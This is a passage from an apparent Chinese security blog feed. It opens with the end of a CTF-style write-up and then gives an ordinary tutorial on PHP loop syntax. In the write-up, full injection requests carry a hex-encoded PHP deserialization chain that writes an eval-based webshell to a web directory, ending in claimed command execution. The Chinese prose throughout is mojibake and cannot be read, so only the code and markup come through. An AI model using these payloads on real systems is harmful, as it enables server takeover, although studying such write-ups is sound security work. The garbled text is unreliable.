<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=2&amp;name=sss&amp;price=100.00&amp;on_sale_time=2023-05-05T02%3A20%3A54&amp;image=https%3A%2F%2Fi.postimg.cc%2FFzvNFBG8%2FR-6-HI3-YKR-UF-JG0-G-N.jpg&amp;data`%3dunhex(%27547a6f794e7a6f6964476870626d746363484a765932567a633178776158426c633178586157356b6233647a496a6f784f6e747a4f6a4d304f69494164476870626d746363484a765932567a633178776158426c633178586157356b6233647a41475a706247567a496a74684f6a453665326b364d4474504f6a45334f694a3061476c75613178746232526c6246785161585a76644349364e6a7037637a6f354f6949414b6742686348426c626d51694f3245364d54703761546f774f334d364f446f695a32563052584a79623349694f33317a4f6a67364967417141475679636d3979496a74504f6a49334f694a3061476c75613178746232526c624678795a57786864476c76626c784959584e50626d55694f6a4d3665334d364d5445364967417141474a70626d524264485279496a74684f6a493665326b364d44747a4f6a4936496d3576496a74704f6a4537637a6f7a4f6949784d6a4d694f33317a4f6a45314f6949414b67427a5a57786d556d567359585270623234694f3249364d44747a4f6a673649674171414846315a584a35496a74504f6a45304f694a3061476c756131786b596c785264575679655349364d547037637a6f344f6949414b6742746232526c62434937547a6f794d446f6964476870626d746359323975633239735a56785064585277645851694f6a493665334d364d6a67364967423061476c756131786a6232357a6232786c58453931644842316441426f5957356b624755694f3038364d7a4136496e526f6157357258484e6c63334e70623235635a484a70646d56795845316c62574e685932686c5a4349364d547037637a6f784d446f6941436f41614746755a47786c63694937547a6f794d7a6f6964476870626d74635932466a614756635a484a70646d567958455a70624755694f6a493665334d364d544136496741714147397764476c76626e4d694f3245364e547037637a6f324f694a6c65484270636d55694f326b364d44747a4f6a45794f694a6a59574e6f5a56397a64574a6b615849694f3249364d44747a4f6a5936496e42795a575a7065434937637a6f774f6949694f334d364e446f696347463061434937637a6f784d444d36496e426f63446f764c325a706248526c63693933636d6c305a54317a64484a70626d6375636d39304d544d76636d567a62335679593255394c335a6863693933643363766148527462433979645735306157316c4c33526c625841765044396a64574d675933566a646d467a596967704f334a70626e6b6f4a463955556b64626348707858536b37507a34694f334d364d544d36496d5268644746665932397463484a6c63334d694f3249364d447439637a6f324f6949414b674230595763694f3249364d54743966584d364f546f6941436f41633352356247567a496a74684f6a453665326b364d44747a4f6a6336496d646c64454630644849694f3331396658317a4f6a5936496e4268636d567564434937547a6f794d446f6964476870626d746359323975633239735a56785064585277645851694f6a493665334d364d6a67364967423061476c756131786a6232357a6232786c58453931644842316441426f5957356b624755694f3038364d7a4136496e526f6157357258484e6c63334e70623235635a484a70646d56795845316c62574e685932686c5a4349364d547037637a6f784d446f6941436f41614746755a47786c63694937547a6f794d7a6f6964476870626d74635932466a614756635a484a70646d567958455a70624755694f6a493665334d364d544136496741714147397764476c76626e4d694f3245364e547037637a6f324f694a6c65484270636d55694f326b364d44747a4f6a45794f694a6a59574e6f5a56397a64574a6b615849694f3249364d44747a4f6a5936496e42795a575a7065434937637a6f774f6949694f334d364e446f696347463061434937637a6f784d444d36496e426f63446f764c325a706248526c63693933636d6c305a54317a64484a70626d6375636d39304d544d76636d567a62335679593255394c335a6863693933643363766148527462433979645735306157316c4c33526c625841765044396a64574d675933566a646d467a596967704f334a70626e6b6f4a463955556b64626348707858536b37507a34694f334d364d544d36496d5268644746665932397463484a6c63334d694f3249364d447439637a6f324f6949414b674230595763694f3249364d54743966584d364f546f6941436f41633352356247567a496a74684f6a453665326b364d44747a4f6a6336496d646c64454630644849694f333139637a6f784e546f6941436f41633256735a6c4a6c6247463061573975496a74694f6a4137637a6f344f6949414b6742786457567965534937547a6f784e446f6964476870626d74635a474a635558566c636e6b694f6a453665334d364f446f6941436f416257396b5a5777694f3038364d6a4136496e526f6157357258474e76626e4e76624756635433563063485630496a6f794f6e747a4f6a49344f69494164476870626d746359323975633239735a5678506458527764585141614746755a47786c496a74504f6a4d774f694a3061476c756131787a5a584e7a615739755847527961585a6c636c784e5a57316a59574e6f5a5751694f6a453665334d364d5441364967417141476868626d52735a5849694f3038364d6a4d36496e526f6157357258474e685932686c5847527961585a6c636c78476157786c496a6f794f6e747a4f6a45774f6949414b674276634852706232357a496a74684f6a553665334d364e6a6f695a58687761584a6c496a74704f6a4137637a6f784d6a6f695932466a61475666633356695a476c79496a74694f6a4137637a6f324f694a77636d566d615867694f334d364d446f69496a747a4f6a5136496e4268644767694f334d364d54417a4f694a77614841364c79396d615778305a58497664334a7064475539633352796157356e4c6e4a766444457a4c334a6c63323931636d4e6c5053393259584976643364334c32683062577776636e567564476c745a5339305a5731774c7a772f5933566a49474e3159335a686332496f4b547479615735354b43526656464a4857334236635630704f7a382b496a747a4f6a457a4f694a6b5958526858324e76625842795a584e7a496a74694f6a413766584d364e6a6f6941436f416447466e496a74694f6a45376658317a4f6a6b364967417141484e306557786c6379493759546f784f6e74704f6a4137637a6f334f694a6e5a58524264485279496a74396658317a4f6a6736496741714147466859574668496a744f4f33313966513d3d%27)/**/WHERE/**/`id`/**/%3d/**/1#=1 &amp;data=1</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20231218165045003.png" alt="image-20231218165045003"></p>
<p>æ˜¾ç¤ºæ›´æ–°æˆåŠŸä¹‹åç‚¹å‡»æŸ¥çœ‹è¯¦æƒ…</p>
<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20231218165115340.png" alt="image-20231218165115340"></p>
<p>ä½†æ˜¯è¿™é‡Œæ˜¾ç¤ºäº†æ•°æ®é”™è¯¯ï¼Œå»æºç ä¸­å¯»æ‰¾ä»¥ä¸‹ä¸ºä»€ä¹ˆä¼šæ˜¾ç¤ºæ•°æ®é”™è¯¯</p>
<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20231218165244243.png" alt="image-20231218165244243"></p>
<p>çœ‹åˆ°dataå†…å®¹çš„å‰ä¸‰ä¸ªå¿…é¡»æ˜¯YToï¼Œbase64è§£ç åæ˜¯a:</p>
<p>ä¹Ÿå°±æ˜¯åªæœ‰åºåˆ—åŒ–æ•°æ®æ˜¯ä¸€ä¸ªæ•°ç»„æ‰èƒ½æ­£å¸¸æŸ¥çœ‹</p>
<p>ä¿®æ”¹ä¸€ä¸‹exp</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å°†ä¸Šé¢çš„expçš„æœ€åä¸€è¡Œæ”¹ä¸º</span><br><span class="line"></span><br><span class="line">echo base64_encode(serialize(array(new Windows())));</span><br></pre></td></tr></table></figure>

<p>ç„¶åå†å°†æ‰§è¡Œçš„å†…å®¹ç»è¿‡åå…­è¿›åˆ¶ç¼–ç åæ‰“payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=2&amp;name=sss&amp;price=100.00&amp;on_sale_time=2023-05-05T02%3A20%3A54&amp;image=https%3A%2F%2Fi.postimg.cc%2FFzvNFBG8%2FR-6-HI3-YKR-UF-JG0-G-N.jpg&amp;data`%3dunhex(%2759546f784f6e74704f6a4137547a6f794e7a6f6964476870626d746363484a765932567a633178776158426c633178586157356b6233647a496a6f784f6e747a4f6a4d304f69494164476870626d746363484a765932567a633178776158426c633178586157356b6233647a41475a706247567a496a74684f6a453665326b364d4474504f6a45334f694a3061476c75613178746232526c6246785161585a76644349364e6a7037637a6f354f6949414b6742686348426c626d51694f3245364d54703761546f774f334d364f446f695a32563052584a79623349694f33317a4f6a67364967417141475679636d3979496a74504f6a49334f694a3061476c75613178746232526c624678795a57786864476c76626c784959584e50626d55694f6a4d3665334d364d5445364967417141474a70626d524264485279496a74684f6a493665326b364d44747a4f6a4936496d3576496a74704f6a4537637a6f7a4f6949784d6a4d694f33317a4f6a45314f6949414b67427a5a57786d556d567359585270623234694f3249364d44747a4f6a673649674171414846315a584a35496a74504f6a45304f694a3061476c756131786b596c785264575679655349364d547037637a6f344f6949414b6742746232526c62434937547a6f794d446f6964476870626d746359323975633239735a56785064585277645851694f6a493665334d364d6a67364967423061476c756131786a6232357a6232786c58453931644842316441426f5957356b624755694f3038364d7a4136496e526f6157357258484e6c63334e70623235635a484a70646d56795845316c62574e685932686c5a4349364d547037637a6f784d446f6941436f41614746755a47786c63694937547a6f794d7a6f6964476870626d74635932466a614756635a484a70646d567958455a70624755694f6a493665334d364d544136496741714147397764476c76626e4d694f3245364e547037637a6f324f694a6c65484270636d55694f326b364d44747a4f6a45794f694a6a59574e6f5a56397a64574a6b615849694f3249364d44747a4f6a5936496e42795a575a7065434937637a6f774f6949694f334d364e446f696347463061434937637a6f784d444d36496e426f63446f764c325a706248526c63693933636d6c305a54317a64484a70626d6375636d39304d544d76636d567a62335679593255394c335a6863693933643363766148527462433979645735306157316c4c33526c625841765044396a64574d675933566a646d467a596967704f334a70626e6b6f4a463955556b64626348707858536b37507a34694f334d364d544d36496d5268644746665932397463484a6c63334d694f3249364d447439637a6f324f6949414b674230595763694f3249364d54743966584d364f546f6941436f41633352356247567a496a74684f6a453665326b364d44747a4f6a6336496d646c64454630644849694f3331396658317a4f6a5936496e4268636d567564434937547a6f794d446f6964476870626d746359323975633239735a56785064585277645851694f6a493665334d364d6a67364967423061476c756131786a6232357a6232786c58453931644842316441426f5957356b624755694f3038364d7a4136496e526f6157357258484e6c63334e70623235635a484a70646d56795845316c62574e685932686c5a4349364d547037637a6f784d446f6941436f41614746755a47786c63694937547a6f794d7a6f6964476870626d74635932466a614756635a484a70646d567958455a70624755694f6a493665334d364d544136496741714147397764476c76626e4d694f3245364e547037637a6f324f694a6c65484270636d55694f326b364d44747a4f6a45794f694a6a59574e6f5a56397a64574a6b615849694f3249364d44747a4f6a5936496e42795a575a7065434937637a6f774f6949694f334d364e446f696347463061434937637a6f784d444d36496e426f63446f764c325a706248526c63693933636d6c305a54317a64484a70626d6375636d39304d544d76636d567a62335679593255394c335a6863693933643363766148527462433979645735306157316c4c33526c625841765044396a64574d675933566a646d467a596967704f334a70626e6b6f4a463955556b64626348707858536b37507a34694f334d364d544d36496d5268644746665932397463484a6c63334d694f3249364d447439637a6f324f6949414b674230595763694f3249364d54743966584d364f546f6941436f41633352356247567a496a74684f6a453665326b364d44747a4f6a6336496d646c64454630644849694f333139637a6f784e546f6941436f41633256735a6c4a6c6247463061573975496a74694f6a4137637a6f344f6949414b6742786457567965534937547a6f784e446f6964476870626d74635a474a635558566c636e6b694f6a453665334d364f446f6941436f416257396b5a5777694f3038364d6a4136496e526f6157357258474e76626e4e76624756635433563063485630496a6f794f6e747a4f6a49344f69494164476870626d746359323975633239735a5678506458527764585141614746755a47786c496a74504f6a4d774f694a3061476c756131787a5a584e7a615739755847527961585a6c636c784e5a57316a59574e6f5a5751694f6a453665334d364d5441364967417141476868626d52735a5849694f3038364d6a4d36496e526f6157357258474e685932686c5847527961585a6c636c78476157786c496a6f794f6e747a4f6a45774f6949414b674276634852706232357a496a74684f6a553665334d364e6a6f695a58687761584a6c496a74704f6a4137637a6f784d6a6f695932466a61475666633356695a476c79496a74694f6a4137637a6f324f694a77636d566d615867694f334d364d446f69496a747a4f6a5136496e4268644767694f334d364d54417a4f694a77614841364c79396d615778305a58497664334a7064475539633352796157356e4c6e4a766444457a4c334a6c63323931636d4e6c5053393259584976643364334c32683062577776636e567564476c745a5339305a5731774c7a772f5933566a49474e3159335a686332496f4b547479615735354b43526656464a4857334236635630704f7a382b496a747a4f6a457a4f694a6b5958526858324e76625842795a584e7a496a74694f6a413766584d364e6a6f6941436f416447466e496a74694f6a45376658317a4f6a6b364967417141484e306557786c6379493759546f784f6e74704f6a4137637a6f334f694a6e5a58524264485279496a74396658317a4f6a6736496741714147466859574668496a744f4f3331396658303d%27)/**/WHERE/**/`id`/**/%3d/**/1#=1 &amp;data=1</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20231218165701575.png" alt="image-20231218165701575"></p>
<p>çœ‹åˆ°è¿™ä¸ªè¯´æ˜ååºåˆ—åŒ–æˆåŠŸ</p>
<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20231218165720197.png" alt="image-20231218165720197"></p>
<p>æœ€åå°±å¯ä»¥å‘½ä»¤æ‰§è¡Œäº†</p>
<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20231218165742506.png" alt="image-20231218165742506"></p>
]]></content>
  </entry>
  <entry>
    <title>å¾ªç¯ç”¨æ³•</title>
    <url>/2022/10/27/%E5%BE%AA%E7%8E%AF/</url>
    <content><![CDATA[<p>phpå¾ªç¯çš„ç”¨æ³•</p>
<span id="more"></span>

<h4 id="1-whileå¾ªç¯"><a href="#1-whileå¾ªç¯" class="headerlink" title="1.whileå¾ªç¯"></a>1.whileå¾ªç¯</h4><p>whileå¾ªç¯è¯­å¥æ˜¯ä¸€ç§å½“å‹å¾ªç¯è¯­å¥ï¼Œå…ˆå¯¹å¾ªç¯æ¡ä»¶è¿›è¡Œåˆ¤æ–­ï¼Œå½“æ¡ä»¶æ»¡è¶³ï¼Œåˆ™æ‰§è¡Œå¾ªç¯ä½“ï¼Œä¸æ»¡è¶³æ—¶åˆ™åœæ­¢ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">whileå¾ªç¯çš„ä¸€èˆ¬æ ¼å¼</span><br><span class="line">while(è¡¨è¾¾å¼)&#123;</span><br><span class="line">    phpè¯­å¥;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¼šå…ˆè®¡ç®—è¡¨è¾¾å¼çš„å€¼ï¼Œå¦‚æœè¡¨è¾¾å¼çš„å€¼ä¸ºçœŸå°±ä¼šå¼€å§‹phpè¯­å¥</p>
<p>å¹¶ä¸”å¦‚æœä¸ºçœŸæ‰§è¡Œå®Œä¸€æ¬¡phpè¯­å¥æ—¶ï¼Œä¼šå†æ¬¡è¿›å…¥åˆ¤æ–­è¡¨è¾¾å¼çš„å€¼ï¼Œä¸ºçœŸä¼šå†æ¬¡è¿›å…¥å¾ªç¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$i=1;</span><br><span class="line">$sum=0;</span><br><span class="line">while($i&lt;=100)&#123;   //åªæœ‰$i&lt;=100æ—¶ï¼Œè¯¥å¾ªç¯æ‰ä¼šåœæ­¢</span><br><span class="line">    $sum+=$i;</span><br><span class="line">    $i++;</span><br><span class="line">&#125;</span><br><span class="line">echo $sum;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæ˜¯è®¡ç®—1åˆ°100çš„æ‰€æœ‰æ•°çš„å’Œ</p>
<h4 id="2-do-whileå¾ªç¯"><a href="#2-do-whileå¾ªç¯" class="headerlink" title="2.do-whileå¾ªç¯"></a>2.do-whileå¾ªç¯</h4><p>do-whileå¾ªç¯è¯­å¥æ˜¯ä¸€ç§â€œç›´åˆ°å‹â€å¾ªç¯è¯­å¥ï¼Œå®ƒæ˜¯å…ˆåœ¨æ‰§è¡Œäº†ä¸€æ¬¡å¾ªç¯ä½“ä¸­çš„â€œè¯­å¥å—â€ä¹‹åï¼Œç„¶åå†å¯¹å¾ªç¯æ¡ä»¶è¿›è¡Œåˆ¤æ–­ï¼Œå¦‚æœä¸ºçœŸåˆ™ç»§ç»­å¾ªç¯ï¼Œå¦‚æœä¸ºå‡ï¼Œåˆ™ç»ˆæ­¢å¾ªç¯ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">do-whileå¾ªç¯çš„ä¸€èˆ¬æ ¼å¼</span><br><span class="line">do&#123;</span><br><span class="line">   è¯­å¥å—;</span><br><span class="line">&#125;while();</span><br></pre></td></tr></table></figure>

<p>ä¼šå…ˆæ‰§è¡Œè¯­å¥å—ï¼Œç„¶ååˆ¤æ–­å¾ªç¯æ¡ä»¶æ˜¯å¦æˆç«‹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$i=1;</span><br><span class="line">$sum=0;</span><br><span class="line">do&#123;</span><br><span class="line">    $sum+=$i;</span><br><span class="line">    $i++;</span><br><span class="line">&#125;while($i&lt;=100);</span><br><span class="line">echo $sum;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæ˜¯è®¡ç®—1åˆ°100æ‰€æœ‰æ•°çš„å’Œ</p>
<h4 id="3-forå¾ªç¯"><a href="#3-forå¾ªç¯" class="headerlink" title="3.forå¾ªç¯"></a>3.forå¾ªç¯</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fouå¾ªç¯çš„ä¸€èˆ¬æ ¼å¼</span><br><span class="line">for(åˆå§‹åŒ–è¯­å¥;å¾ªç¯æ¡ä»¶;å˜é‡æ›´æ–°-è‡ªå¢æˆ–è‡ªå‡)&#123;</span><br><span class="line">   è¯­å¥å—;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>åˆå§‹åŒ–è¯­å¥ï¼ˆè¡¨è¾¾å¼1ï¼‰ï¼šä¸»è¦æ˜¯åˆå§‹åŒ–ä¸€ä¸ªå˜é‡å€¼ï¼Œç”¨äºè®¾ç½®ä¸€ä¸ªè®¡æ•°å™¨ï¼Œå³å¾ªç¯å¼€å§‹çš„å€¼ï¼›è¯¥è¯­å¥ä»…åœ¨ç¬¬ä¸€æ¬¡å¾ªç¯æ—¶æ‰§è¡Œï¼Œä»¥åéƒ½ä¸ä¼šå†æ‰§è¡Œã€‚</p>
</li>
<li><p>å¾ªç¯æ¡ä»¶ï¼ˆè¡¨è¾¾å¼2ï¼‰ï¼šå¾ªç¯æ‰§è¡Œçš„é™åˆ¶æ¡ä»¶ï¼Œç”¨äºæ§åˆ¶æ˜¯å¦æ‰§è¡Œå¾ªç¯ä½“ä¸­çš„ä»£ç ï¼›å¦‚æœæ¡ä»¶ä¸ºTRUEï¼Œåˆ™å¾ªç¯ç»§ç»­ï¼Œå¦‚æœæ¡ä»¶ä¸ºFALSE ï¼Œåˆ™å¾ªç¯ç»“æŸï¼Œç«‹å³é€€å‡ºå¾ªç¯ã€‚</p>
</li>
<li><p>å˜é‡æ›´æ–°ï¼ˆè¡¨è¾¾å¼3ï¼‰ï¼šä¸€ä¸ªå¸¦æœ‰è‡ªå¢æˆ–è‡ªå‡æ“ä½œçš„è¡¨è¾¾å¼ï¼Œå¾ªç¯æ¯æ‰§è¡Œä¸€æ¬¡ï¼Œé©¬ä¸Šä¿®æ”¹è®¡æ•°å™¨çš„å€¼ï¼Œä»¥ä½¿å¾ªç¯æ¡ä»¶é€æ¸å˜å¾—â€œä¸æˆç«‹â€ã€‚</p>
</li>
<li><p>è¯­å¥å—ï¼šæ¡ä»¶åˆ¤æ–­ä¸ºçœŸæ—¶ï¼Œéœ€è¦æ‰§è¡Œçš„è‹¥å¹²ä»£ç ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">for ($i=1;$i&lt;=100;$i++)&#123;</span><br><span class="line">    $sum+=$i;</span><br><span class="line">&#125;</span><br><span class="line">echo $sum;</span><br></pre></td></tr></table></figure>

<p>ä»1åŠ åˆ°100</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">for ($i=2,$sum=1;$i&lt;=100;$i++)&#123;</span><br><span class="line">    $sum*=$i;</span><br><span class="line">&#125;</span><br><span class="line">echo $sum;</span><br></pre></td></tr></table></figure>

<p>ä»1ä¹˜åˆ°100</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$h=array(&quot;ä¸€&quot;,&quot;äºŒ&quot;,&quot;ä¸‰&quot;,&quot;å››&quot;,&quot;äº”&quot;);</span><br><span class="line">for ($i=0;$i&lt;count($h);$i++)&#123;</span><br><span class="line">     echo $h[$i] . &quot;&lt;br/&gt;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¾“å‡ºä¸€ äºŒ ä¸‰ å›› äº”</p>
<h4 id="4-foreachè¯­å¥"><a href="#4-foreachè¯­å¥" class="headerlink" title="4.foreachè¯­å¥"></a>4.foreachè¯­å¥</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">foreachçš„æ ¼å¼ä¸€</span><br><span class="line">foreach($array as $value)&#123;</span><br><span class="line">   è¯­å¥å—;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç»™å®šçš„ $arrayæ•°ç»„ï¼Œåœ¨æ¯æ¬¡å¾ªç¯ä¸­å°†å½“å‰æ•°ç»„çš„å€¼èµ‹ç»™ $valueã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">foreachçš„æ ¼å¼äºŒ</span><br><span class="line">foreach($array as $key =&gt; $value)&#123;</span><br><span class="line">   è¯­å¥å—;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç»™å®šçš„ $array æ•°ç»„ï¼Œåœ¨æ¯æ¬¡å¾ªç¯ä¸­ä¼šå°†å½“å‰æ•°ç»„çš„å€¼èµ‹ç»™ $valueï¼Œé”®åèµ‹ç»™ $keyã€‚</p>
<p><strong>é€ä¸ªè¾“å‡ºæ•°ç»„çš„é”®å€¼æˆ–è€…é”®åå€¼å’Œé”®å€¼</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$h=array(&quot;ä¸€&quot;,&quot;äºŒ&quot;,&quot;ä¸‰&quot;,&quot;å››&quot;,&quot;äº”&quot;);</span><br><span class="line">foreach ($h as $value)&#123;</span><br><span class="line">    echo $value.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¾“å‡ºä¸€ äºŒ ä¸‰ å›› äº”</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$h=array(&quot;ä¸€&quot;,&quot;äºŒ&quot;,&quot;ä¸‰&quot;,&quot;å››&quot;,&quot;äº”&quot;);</span><br><span class="line">foreach ($h as $key=&gt;$value)&#123;</span><br><span class="line">    echo $key;</span><br><span class="line">    echo $value.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¾“å‡º0ä¸€ 1äºŒ 2ä¸‰ 3å›› 4äº”</p>
<p><strong>ä¸ä»…å¯ä»¥è¾“å‡ºæ•°ç»„ï¼Œä¹Ÿå¯ä»¥è¾“å‡ºå¯¹è±¡çš„æˆå‘˜å±æ€§åå’Œæˆå‘˜å±æ€§å€¼</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class user&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    public $age;</span><br><span class="line">    public $sex;</span><br><span class="line"></span><br><span class="line">    public function __construct($name,$age,$sex)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name=$name;</span><br><span class="line">        $this-&gt;age=$age;</span><br><span class="line">        $this-&gt;sex=$sex;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$h=new user(&#x27;æå&#x27;,12,&#x27;ç”·&#x27;);</span><br><span class="line">foreach ($h as $v) &#123;</span><br><span class="line">    echo $v . &#x27;&lt;br/&gt;&#x27;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¾“å‡ºæå12ç”·</p>
<p><strong>ä¿®æ”¹æ•°ç»„çš„é”®åå’Œé”®å€¼</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$h=array(1,2,3,4,5);</span><br><span class="line">foreach ($h as $value)&#123;</span><br><span class="line">    $value=$value*2 . &quot;&lt;br/&gt;&quot;;</span><br><span class="line">    echo $value;</span><br><span class="line">&#125;</span><br><span class="line">var_dump($h);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//è¾“å‡ºä¸º</span><br><span class="line">2</span><br><span class="line">4</span><br><span class="line">6</span><br><span class="line">8</span><br><span class="line">10</span><br><span class="line">array(5) &#123; [0]=&gt; int(1) [1]=&gt; int(2) [2]=&gt; int(3) [3]=&gt; int(4) [4]=&gt; int(5) &#125;</span><br></pre></td></tr></table></figure>

<p>è™½ç„¶ä½¿ç”¨foreachæ”¹å˜äº†é”®å€¼ï¼Œä½†åœ¨å¤–éƒ¨è¾“å‡ºæ•°ç»„$hæ—¶å®ƒçš„é”®å€¼å¹¶æ²¡æœ‰æ”¹å˜</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$h=array(1,2,3,4,5);</span><br><span class="line">foreach ($h as &amp;$value)&#123;      /åœ¨$valueçš„å‰é¢åŠ ä¸Šä¸€ä¸ª&amp;å·é‚£ä¹ˆå°±ä¼šæ”¹å˜å¤–éƒ¨è¾“å‡ºçš„æ•°ç»„çš„é”®å€¼</span><br><span class="line">    $value=$value*2 . &quot;&lt;br/&gt;&quot;;</span><br><span class="line">    echo $value;</span><br><span class="line">&#125;</span><br><span class="line">var_dump($h);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//è¾“å‡ºä¸º</span><br><span class="line">2</span><br><span class="line">4</span><br><span class="line">6</span><br><span class="line">8</span><br><span class="line">10</span><br><span class="line">array(5) &#123; [0]=&gt; string(6) &quot;2</span><br><span class="line">&quot; [1]=&gt; string(6) &quot;4</span><br><span class="line">&quot; [2]=&gt; string(6) &quot;6</span><br><span class="line">&quot; [3]=&gt; string(6) &quot;8</span><br><span class="line">&quot; [4]=&gt; &amp;string(7) &quot;10</span><br><span class="line">&quot; &#125;      //å‘ç°åœ¨è¾“å‡ºçš„æœ€åæœ‰ä¸€ä¸ª&amp;å·</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">å¯ä»¥ä½¿ç”¨unsetå°†&amp;å·å»æ‰ï¼Œå¦‚ä¸‹</span><br><span class="line">&lt;?php</span><br><span class="line">$h=array(1,2,3,4,5);</span><br><span class="line">foreach ($h as &amp;$value)&#123;</span><br><span class="line">    $value=$value*2 . &quot;&lt;br/&gt;&quot;;</span><br><span class="line">    echo $value;</span><br><span class="line">&#125;</span><br><span class="line">unset($value);</span><br><span class="line">var_dump($h);</span><br></pre></td></tr></table></figure>

<h4 id="5-è·³å‡ºå¾ªç¯"><a href="#5-è·³å‡ºå¾ªç¯" class="headerlink" title="5.è·³å‡ºå¾ªç¯"></a>5.è·³å‡ºå¾ªç¯</h4><p><strong>continueè¯­å¥</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">for ($i=1;$i&lt;=10;$i++)&#123;</span><br><span class="line">    if($i % 2 !=0)&#123;  //å¦‚æœ$iå¯ä»¥è¢«2æ•´é™¤åˆ™ç›´æ¥æ‰§è¡Œecho,ä¸èƒ½æ•´é™¤å°±ä¼šæ‰§è¡Œcontinue</span><br><span class="line">        continue;   //æ‰§è¡Œcontinueä¼šè·³å‡ºæœ¬æ¬¡çš„å¾ªç¯ï¼Œè€Œè¿›è¡Œä¸‹ä¸€æ¬¡çš„å¾ªç¯</span><br><span class="line">    &#125;</span><br><span class="line">    echo $i.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¾“å‡º2ï¼Œ4ï¼Œ6ï¼Œ8ï¼Œ10</p>
<p><strong>breakè¯­å¥</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">for ($i=1;$i&lt;=10;$i++)&#123;</span><br><span class="line">    if($i % 2 !=0)&#123;</span><br><span class="line">        break;  //ä¼šå°†æ•´ä¸ªå¾ªç¯è·³å‡ºï¼Œä¸ä¼šè¿›è¡Œä¸‹ä¸€æ¬¡çš„å¾ªç¯</span><br><span class="line">    &#125;</span><br><span class="line">    echo $i.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·ä¼šä»€ä¹ˆéƒ½ä¸è¾“å‡º</p>
<p><strong>gotoè¯­å¥</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">for ($i=1;$i&lt;=10;$i++)&#123;</span><br><span class="line">    if($i % 2 ==0)&#123;</span><br><span class="line">        goto a;</span><br><span class="line">    &#125;</span><br><span class="line">    echo $i.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">a:  //æ‰§è¡Œgotoæ—¶ä¼šè·³åˆ°è¿™ä¸ªåœ°æ–¹</span><br></pre></td></tr></table></figure>

<p>è¾“å‡º1ï¼ŒåŸå› æ˜¯å½“$i&#x3D;1æ—¶gotoä¸ä¼šæ‰§è¡Œï¼Œè€Œæ˜¯æ‰§è¡Œechoï¼Œå½“$i&#x3D;2æ—¶ï¼Œgotoæ‰§è¡Œåï¼Œç›´æ¥è·³åˆ°å¾ªç¯å¤–é¢çš„aå¤„ï¼Œä¼šä½¿å¾ªç¯ä¸ä¼šå†æ¬¡è¿›è¡Œ</p>
<p><strong>die()&#x2F;exit()è¯­å¥</strong></p>
<p>exit å’Œ die è¿™ä¸¤ä¸ªåå­—æŒ‡å‘çš„æ˜¯åŒä¸€ä¸ªå‡½æ•°ï¼Œä½¿ç”¨æ•ˆæœç›¸åŒ</p>
<p>ç»“æŸç¨‹åºæ‰§è¡Œçš„ï¼Œå¯ä»¥ç”¨åœ¨ä»»ä½•åœ°æ–¹ã€‚</p>
